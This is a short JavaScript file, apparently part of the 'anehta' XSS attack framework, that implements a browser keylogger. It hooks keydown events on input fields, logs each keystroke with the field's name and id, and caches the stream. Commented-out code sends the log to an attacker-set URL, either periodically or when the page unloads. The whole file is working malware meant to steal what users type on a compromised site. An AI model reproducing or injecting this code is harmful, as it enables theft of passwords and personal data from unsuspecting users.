//alert("keylog.js");
//////////////////////////////////////////////////////
//// 基于js的键盘记录器
//// Author: axis
//////////////////////////////////////////////////////

var tagName = new Array("input", "textarea");

//$("textarea").keydown(function(){ alert();});
var keylogger = new Array();
var keystrokes = ""; //记录所有键盘记录
var i = 0; // 计数器
var j = 1; // 全局计数器

$(tagName[0]).keydown(function(event){
	/* 实时发送;通过控制i调整频率
	if ( i>=10 ){
		anehta.net.getURL(logurl+escape(keylogger));
		i = 0; // 重置计数器
	}
	*/
	// json data format
	keylogger[i] = "{tag:'"+tagName[0]+
	               "', name:'"+this.name+
	               "', id:'"+this.id+
	               "', press:'"+j+
	               "', key:'"+String.fromCharCode(event.keyCode)+
	               "', keyCode:'"+event.keyCode+
	               "'}";  
	
	keystrokes = String.fromCharCode(event.keyCode);  
	anehtaCache.appendItem("KeyStrokes", keystrokes);                        
	//alert(keystrokes);
	i=i+1;
	j=j+1
});

// input失去焦点时触发
$(tagName[0]).blur(function(){
	                   //anehta.logger.logInfo(keylogger);
	                   //anehta.core.freeze(200);
	                 }
);

/*
// 在窗口关闭时候发送keylog 到服务器
// 不稳定,如果是提交表单到其他页面的话,会post出错
// 如果unload事件已经被改写的话,会出问题
$(window).unload(function(){
	//alert(keylogger);
	// 时间不允许再base64加密了
	//keylogger = anehta.crypto.base64encode(keylogger);
	// 明文传输,需要标记为NoCryptMark
	keylogger = NoCryptMark + XssInfo_S+"Keylogger: " + keylogger + XssInfo_E;
	//alert(keylogger);
	//anehta.core.freeze(500);
	anehta.net.getURL(logurl+escape(keylogger));
	anehta.core.freeze(900);
	//alert(keylogger);	
}
);
*/
